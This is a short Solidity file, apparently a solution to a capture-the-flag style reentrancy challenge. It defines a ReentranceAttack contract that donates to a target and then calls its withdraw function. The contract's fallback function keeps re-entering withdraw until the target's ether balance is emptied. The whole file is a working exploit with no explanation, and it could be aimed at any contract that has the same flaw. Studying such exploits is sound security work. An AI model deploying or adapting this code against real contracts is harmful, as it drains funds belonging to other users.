// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Reentrance{
    function withdraw(uint _amount) external;
    function donate(address _to) external payable; 
}

contract ReentranceAttack{
    constructor() payable{}

    function donate(address target) external {
        Reentrance(target).donate{value: 0.001 ether}(address(this));
    }

    function attack(address target, uint256 amount) public {
        Reentrance(target).withdraw(amount);
    }

    fallback() external payable{
        if(msg.sender.balance >= 0.001 ether){
            attack(msg.sender, 0.001 ether);    
        }else{
            if(msg.sender.balance != 0){
                attack(msg.sender, msg.sender.balance);    
            }else{
                
            }
        }
    }
}